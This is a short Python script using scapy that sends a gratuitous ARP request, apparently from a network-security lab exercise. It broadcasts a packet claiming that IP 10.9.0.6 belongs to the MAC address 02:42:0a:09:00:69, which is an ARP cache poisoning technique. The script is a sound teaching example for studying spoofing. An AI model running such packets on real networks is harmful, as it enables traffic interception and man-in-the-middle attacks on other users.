#!/usr/bin/env python3
from scapy.all import *

ethernet = Ether()
ethernet.src = "02:42:0a:09:00:69"
ethernet.dst = "ff:ff:ff:ff:ff:ff"

arp = ARP()
arp.op = 1
arp.hwsrc = "02:42:0a:09:00:69"
arp.psrc = "10.9.0.6"
arp.hwdst = "ff:ff:ff:ff:ff:ff"
arp.pdst = "10.9.0.6"

pkt = ethernet / arp
# print(pkt.show())

sendp(pkt)
